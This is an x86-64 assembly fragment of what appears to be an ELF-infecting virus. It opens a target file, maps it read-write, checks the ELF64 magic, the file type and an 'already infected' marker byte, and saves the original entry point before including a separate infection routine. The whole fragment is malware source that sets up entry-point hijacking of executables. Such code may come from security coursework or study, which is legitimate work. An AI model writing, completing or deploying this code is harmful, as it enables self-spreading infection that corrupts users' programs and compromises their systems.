	PUSH_ALL
	; celui la ici
	mov		rax, SYS_open
	mov		rdi, [rbp + 16]
	add		rdi, mydata.path
	;lea		rdi, [rel path]
	mov		rsi, 2
	xor		rdx, rdx
	syscall
	mov     r12, rax


	cmp		rax, 0
	jle		.returnprepare_infection
	mov		r12, rax

	mov		rdi, [rbp + 16]
	add		rdi, mydata.stack
	;lea		rdi, [rel stack]
	mov		rcx, 144
	xor		rax, rax
	rep		stosb

	; fstat(fd, &stat)
	mov     rdi, r12
	mov     rax, SYS_fstat


	mov		rsi, [rbp + 16]
	add		rsi, mydata.stack
	;lea     rsi, [stack]
	syscall
	cmp     rax, 0
	jl     .close_file_nomapprepare_infection

	; save file size
	mov     rax, [rsi + 48]
	mov		rsi, [rbp + 16]
	add		rsi, mydata.file_size
	mov     [rsi], rax

	; mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)
	mov		rax, [rsi]

	mov     rax, SYS_mmap
	xor     rdi, rdi
	mov     rsi, [rsi]
	mov     rdx, PROT_READ | PROT_WRITE
	mov     r10, MAP_SHARED
	mov     r8, r12
	xor     r9, r9
	syscall
	cmp     rax, -4095
	jae     .close_file_nomapprepare_infection

	mov r14, rax

	; check is elf
	cmp dword [r14], 0x464c457f
	jne .close_fileprepare_infection

	; check is elf64
	cmp byte [r14 + 0x4], 0x2
	jne .close_fileprepare_infection

	; check infected
	cmp byte [r14 + 0xa], 0x0
	jne .close_fileprepare_infection


	mov		rax, [rbp + 16]
	add		rax, mydata.dynm

	mov	BYTE [rax], 0


	cmp	byte [r14 + 0x10], 0x02
	je	.continue_infectionprepare_infection
	mov		rax, [rbp + 16]
	add		rax, mydata.dynm
	mov	BYTE [rax], 1
	cmp	byte [r14 + 0x10], 0x03
	je	.continue_infectionprepare_infection



	jmp	.close_fileprepare_infection

	.continue_infectionprepare_infection:

	mov		rax, [r14 + 0x18] ; e_entry
	mov		rcx, [rbp + 16]
	add		rcx, mydata.old_entry
	mov		[rcx], rax

	movzx	rcx, word [r14 + 0x38] ; e_phnum
	movzx	rdi, word [r14 + 0x36] ; e_phentisize
	xor		r11, r11
	NOP
	NOP
	NOP
	NOP
	xor		r10, r10
	NOP
	NOP
	NOP
	NOP

	%include "functions/infection.s"
	;call	infection

	.close_fileprepare_infection:
		mov		rax, SYS_munmap
		mov		rdi, r14
		mov		rsi, [rbp + 16]
		add		rsi, mydata.file_size
		mov		rsi, [rsi]
		;syscall
	.close_file_nomapprepare_infection:
		mov		rax, SYS_close
		mov		rdi, r12
		syscall
	.returnprepare_infection:
		mov		rsi, [rbp + 16]
		add		rsi, mydata.path
		;lea		rsi, [rel path]
		%include "functions/sub_val.s"
		POP_ALL
